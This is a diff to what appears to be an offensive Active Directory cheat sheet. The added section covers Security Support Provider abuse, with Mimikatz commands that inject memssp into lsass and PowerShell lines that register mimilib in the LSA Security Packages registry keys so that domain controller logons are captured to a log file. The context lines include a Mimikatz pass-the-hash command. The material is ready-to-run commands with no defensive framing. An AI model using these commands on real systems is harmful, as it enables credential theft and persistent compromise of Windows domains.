@@ -41,6 +41,20 @@ C:> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAd
 5. PAss the hash
 C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
 ```
+### SSP (Security Support Provider)
+- Inject into `lsass` using Mimikatz
+```powershell
+C:> Invoke-Mimikatz -Command '"misc::memssp"'
+```
+- Use `mimilib.dll`
+```powershell
+C:> $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
+C:> $packages += mimilib
+C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+```
+- All logons on DC logged to `C:\Windows\system32\kiwissp.log`
+
 
 ### MORE
 
